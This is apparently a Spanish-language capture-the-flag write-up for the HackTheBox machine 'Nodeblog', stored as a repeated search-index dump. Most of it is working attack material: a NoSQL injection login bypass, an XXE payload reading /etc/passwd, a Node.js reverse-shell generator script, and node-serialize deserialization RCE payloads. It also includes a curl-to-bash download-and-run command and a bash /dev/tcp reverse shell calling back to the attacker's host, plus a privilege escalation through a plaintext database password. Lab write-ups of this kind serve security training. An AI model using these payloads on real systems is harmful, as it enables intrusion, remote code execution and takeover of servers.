'mongoose' ) const Article = require ( './models/article' ) const articleRouter = require ( './routes/articles' ) const loginRouter = require ( './routes/login' ) const serialize = require ( 'node-serialize' ) const methodOverride = require ( 'method-override' ) const fileUpload = require ( 'express-fileupload' ) const cookieParser = require ( 'cookie-parser' ); const crypto = require ( 'crypto' ) const cookie_secret = \"UHC-SecretCookie\" //var session = require('express-session'); const app = express () mongoose . connect ( 'mongodb://localhost/blog' ) app . set ( 'view engine' , 'ejs' ) app . use ( express . urlencoded ({ extended : false })) app . use ( methodOverride ( '_method' )) app . use ( fileUpload ()) app . use ( express . json ()); app . use ( cookieParser ()); //app.use(session({secret: \"UHC-SecretKey-123\"})); function authenticated ( c ) { if ( typeof c == 'undefined' ) return false c = serialize . unserialize ( c ) if ( c . sign == ( crypto . createHash ( 'md5' ). update ( cookie_secret + c . user ). digest ( 'hex' )) ){ return true } else { return false } } app . get ( '/' , async ( req , res ) => { const articles = await Article . find (). sort ({ createdAt : 'desc' }) res . render ( 'articles/index' , { articles : articles , ip : req . socket . remoteAddress , authenticated : authenticated ( req . cookies . auth ) }) }) app . use ( '/articles' , articleRouter ) app . use ( '/login' , loginRouter ) app . listen ( 5000 ) Immediately Invoked Function Expression (IIFE) Esta vulnerabilidad se explota colocando parentesis \"()\" en un puto de la data serializada o deserializada, para que se realice la ejecuci\u00f3n antes de dicho proceso. Generador de rshell para nodejs: #!/usr/bin/python # Generator for encoded NodeJS reverse shells # Based on the NodeJS reverse shell by Evilpacket # https://github.com/evilpacket/node-shells/blob/master/node_revshell.js # Onelineified and suchlike by infodox (and felicity, who sat on the keyboard) # Insecurety Research (2013) - insecurety.net import sys if len ( sys . argv ) != 3 : print \"Usage: %s <LHOST> <LPORT>\" % ( sys . argv [ 0 ]) sys . exit ( 0 ) IP_ADDR = sys . argv [ 1 ] PORT = sys . argv [ 2 ] def charencode ( string ): \"\"\"String.CharCode\"\"\" encoded = '' for char in string : encoded = encoded + \",\" + str ( ord ( char )) return encoded [ 1 :] print \"[+] LHOST = %s \" % ( IP_ADDR ) print \"[+] LPORT = %s \" % ( PORT ) NODEJS_REV_SHELL = ''' var net = require('net'); var spawn = require('child_process').spawn; HOST=\" %s \"; PORT=\" %s \"; TIMEOUT=\"5000\"; if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; } function c(HOST,PORT) { var client = new net.Socket(); client.connect(PORT, HOST, function() { var sh = spawn('/bin/sh',[]); client.write(\"Connected! \\\\ n\"); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); sh.on('exit',function(code,signal){ client.end(\"Disconnected! \\\\ n\"); }); }); client.on('error', function(e) { setTimeout(c(HOST,PORT), TIMEOUT); }); } c(HOST,PORT); ''' % ( IP_ADDR , PORT ) print \"[+] Encoding\" PAYLOAD = charencode ( NODEJS_REV_SHELL ) print \"eval(String.fromCharCode( %s ))\" % ( PAYLOAD ) # Se genera la rshell serializada: python2 nodejsshell.py 10 .10.14.16 443 [ + ] LHOST = 10 .10.14.16 [ + ] LPORT = 443 [ + ] Encoding eval ( String.fromCharCode ( 10 ,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,49,54,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,1... # Payload final: { \"rce\" : \"_ $$ ND_FUNC $$ _function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,49,54,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()\" } Como no funciona lo hacemos de forma mas simple modificando el payload e insertandolo como cookie en el navegador urlencodeado: { \"rce\" : \"_ $$ ND_FUNC $$ _function(){require('child_process').exec('ping -c1 10.10.14.16',function(error, stdout, stderr) { console.log(stdout) }); }()\" } # Url encoded with Burp Decoder: %7b%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%28%29%7b%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%70%69%6e%67%20%2d%63%31%20%31%30%2e%31%30%2e%31%34%2e%31%36%27%2c%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%20%7b%20%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%20%7d%29%3b%20%7d%28%29%22%7d%0a Intrusion - Shell Reversa Se consigue el acceso de la siguiente manera: # Payload { \"rce\" : \"_ $$ ND_FUNC $$ _function(){require('child_process').exec('curl 10.10.14.16/rshell.sh|bash',function(error, stdout, stderr) { console.log(stdout) }); }()\" } # Payload urlencoded # Se recibe la petici\u00f3n > cat rshell.sh \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502 File: rshell.sh \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 1 \u2502 #!/bin/bash 2 \u2502 3 \u2502 bash -c \"bash -i >& /dev/tcp/10.10.14.16/443 0>&1\" \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 > python -m http.server 80 Serving HTTP on 0 .0.0.0 port 80 ( http://0.0.0.0:80/ ) ... 10 .10.11.139 - - [ 06 /Sep/2022 02 :16:55 ] \"GET /rshell.sh HTTP/1.1\" 200 - Finalmente se obtiene la flag, curiosamente el home del usuario no ten\u00eda los permisos necesarios, se le asignan con chmod sin problemas: admin@nodeblog:~$ cat user.txt 45b19c9e1c1c0ce18bb276d25c014479 Escalada de privilegios - Root: Se revisa el directorio y se encuentran comandos de mongo en el historico, de esta forma se da con el password del usuario admin: admin@nodeblog:~$ mongo MongoDB shell version v3.6.8 connecting to: mongodb://127.0.0.1:27017 Implicit session: session { \"id\" : UUID ( \"237a4919-fe30-4040-9007-42f7d0035e23\" ) } MongoDB server version: 3 .6.8 Server has startup warnings: 2022 -09-05T16:39:01.320+0000 I CONTROL [ initandlisten ] > show dbs admin 0 .000GB blog 0 .000GB config 0 .000GB local 0 .000GB > use blog switched to db blog > show collections articles users > db.users.find () { \"_id\" : ObjectId ( \"61b7380ae5814df6030d2373\" ) , \"createdAt\" : ISODate ( \"2021-12-13T12:09:46.009Z\" ) , \"username\" : \"admin\" , \"password\" : \"IppsecSaysPleaseSubscribe\" , \"__v\" : 0 } Afortunadamente el usuario tiene privilegios para usar sudo y se obtiene el acceso como root: admin@nodeblog:~$ sudo su [ sudo ] password for admin: IppsecSaysPleaseSubscribe root@nodeblog:/home/admin# cat /root/root.txt bbc0156e85ea877f7e6b18752d3adf41","title":"Nodeblog"},{"location":"maquinas/linux/nodeblog/#nodeblog-htb","text":"","title":"Nodeblog HTB"},{"location":"maquinas/linux/nodeblog/#recon","text":"Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.11.139","title":"Recon"},{"location":"maquinas/linux/nodeblog/#enum","text":"Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.11.139 Se realiza un scan de los puertos abiertos: nmap -sCV -p22,5000 10.10.11.139 -oN openPorts Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 14:37 CEST Nmap scan report for 10.10.11.139 Host is up (0.037s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 5000/tcp open http Node.js (Express middleware) |_http-title: Blog Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel","title":"Enum"},{"location":"maquinas/linux/nodeblog/#nosql-login-bypass","text":"Se consigue bypassear el login con la siguiente petici\u00f3n, incluyendo el content type en json y con una inyecci\u00f3n cl\u00e1sica: POST /login HTTP/1.1 Host: 10.10.11.139:5000 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json Content-Length: 51 Origin: http://10.10.11.139:5000 DNT: 1 Connection: close Referer: http://10.10.11.139:5000/login Upgrade-Insecure-Requests: 1 {\"user\": \"admin\", \"password\": {\"$ne\": \"admin\"}}","title":"NoSQL - Login bypass"},{"location":"maquinas/linux/nodeblog/#xxe-injection","text":"Tras conseguir la cookie y estar en el aplicativo logeados, existe una nueva funcionalidad que es la de subir archivos usando un pantilla xml, esto se deduce porque al subir otro tipo de archivo diferente nos lo indica el error (visto desde el source): Invalid XML Example: < post >< title > Example Post </ title >< description > Example Description </ description >< markdown > Example Markdown </ markdown ></ post > Modificando la plantilla base, se consigue ver el archivo passwd: > catn xxe.xml <?xml version=\"1.0\"?> <!DOCTYPE markdown [<!ENTITY file SYSTEM 'file:///etc/passwd'> ]> < post > < title > Example Post </ title > < description > Example Description </ description > < markdown > &file; </ markdown > </ post > # fichero /etc/passwd daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin admin:x:1000:1000:admin:/home/admin:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mongodb:x:109:117::/var/lib/mongodb:/usr/sbin/nologin Generando errores se puede obtener rutas esenciales, e intuir que siendo un aplicativo node puede tener un fichero (opt/blog/server.js), en el cual se ve que la cookie esta siendo deserializada: const express = require ( 'express' ) const mongoose = require ( 'mongoose' ) const Article = require ( './models/article' ) const articleRouter = require ( './routes/articles' ) const loginRouter = require ( './routes/login' ) const serialize = require ( 'node-serialize' ) const methodOverride = require ( 'method-override' ) const fileUpload = require ( 'express-fileupload' ) const cookieParser = require ( 'cookie-parser' ); const crypto = require ( 'crypto' ) const cookie_secret = \"UHC-SecretCookie\" //var session = require('express-session'); const app = express () mongoose . connect ( 'mongodb://localhost/blog' ) app . set ( 'view engine' , 'ejs' ) app . use ( express . urlencoded ({ extended : false })) app . use ( methodOverride ( '_method' )) app . use ( fileUpload ()) app . use ( express . json ()); app . use ( cookieParser ()); //app.use(session({secret: \"UHC-SecretKey-123\"})); function authenticated ( c ) { if ( typeof c == 'undefined' ) return false c = serialize . unserialize ( c ) if ( c . sign == ( crypto . createHash ( 'md5' ). update ( cookie_secret + c . user ). digest ( 'hex' )) ){ return true } else { return false } } app . get ( '/' , async ( req , res ) => { const articles = await Article . find (). sort ({ createdAt : 'desc' }) res . render ( 'articles/index' , { articles : articles , ip : req . socket . remoteAddress , authenticated : authenticated ( req . cookies . auth ) }) }) app . use ( '/articles' , articleRouter ) app . use ( '/login' , loginRouter ) app . listen ( 5000 )","title":"XXE Injection"},{"location":"maquinas/linux/nodeblog/#immediately-invoked-function-expression-iife","text":"Esta vulnerabilidad se explota colocando parentesis \"()\" en un puto de la data serializada o deserializada, para que se realice la ejecuci\u00f3n antes de dicho proceso. Generador de rshell para nodejs: #!/usr/bin/python # Generator for encoded NodeJS reverse shells # Based on the NodeJS reverse shell by Evilpacket # https://github.com/evilpacket/node-shells/blob/master/node_revshell.js # Onelineified and suchlike by infodox (and felicity, who sat on the keyboard) # Insecurety Research (2013) - insecurety.net import sys if len ( sys . argv ) != 3 : print \"Usage: %s <LHOST> <LPORT>\" % ( sys . argv [ 0 ]) sys . exit ( 0 ) IP_ADDR = sys . argv [ 1 ] PORT = sys . argv [ 2 ] def charencode ( string ): \"\"\"String.CharCode\"\"\" encoded = '' for char in string : encoded = encoded + \",\" + str ( ord ( char )) return encoded [ 1 :] print \"[+] LHOST = %s \" % ( IP_ADDR ) print \"[+] LPORT = %s \" % ( PORT ) NODEJS_REV_SHELL = ''' var net = require('net'); var spawn = require('child_process').spawn; HOST=\" %s \"; PORT=\" %s \"; TIMEOUT=\"5000\"; if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; } function c(HOST,PORT) { var client = new net.Socket(); client.connect(PORT, HOST, function() { var sh = spawn('/bin/sh',[]); client.write(\"Connected! \\\\ n\"); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); sh.on('exit',function(code,signal){ client.end(\"Disconnected! \\\\ n\"); }); }); client.on('error', function(e) { setTimeout(c(HOST,PORT), TIMEOUT); }); } c(HOST,PORT); ''' % ( IP_ADDR , PORT ) print \"[+] Encoding\" PAYLOAD = charencode ( NODEJS_REV_SHELL ) print \"eval(String.fromCharCode( %s ))\" % ( PAYLOAD ) # Se genera la rshell serializada: python2 nodejsshell.py 10 .10.14.16 443 [ + ] LHOST = 10 .10.14.16 [ + ] LPORT = 443 [ + ] Encoding eval ( String.fromCharCode ( 10 ,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,49,54,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,1... # Payload final: { \"rce\" : \"_ $$ ND_FUNC $$ _function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,49,54,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()\" } Como no funciona lo hacemos de forma mas simple modificando el payload e insertandolo como cookie en el navegador urlencodeado: { \"rce\" : \"_ $$ ND_FUNC $$ _function(){require('child_process').exec('ping -c1 10.10.14.16',function(error, stdout, stderr) { console.log(stdout) }); }()\" } # Url encoded with Burp Decoder: %7b%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%28%29%7b%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%70%69%6e%67%20%2d%63%31%20%31%30%2e%31%30%2e%31%34%2e%31%36%27%2c%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%20%7b%20%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%20%7d%29%3b%20%7d%28%29%22%7d%0a","title":"Immediately Invoked Function Expression (IIFE)"},{"location":"maquinas/linux/nodeblog/#intrusion-shell-reversa","text":"Se consigue el acceso de la siguiente manera: # Payload { \"rce\" : \"_ $$ ND_FUNC $$ _function(){require('child_process').exec('curl 10.10.14.16/rshell.sh|bash',function(error, stdout, stderr) { console.log(stdout) }); }()\" } # Payload urlencoded # Se recibe la petici\u00f3n > cat rshell.sh \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502 File: rshell.sh \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 1 \u2502 #!/bin/bash 2 \u2502 3 \u2502 bash -c \"bash -i >& /dev/tcp/10.10.14.16/443 0>&1\" 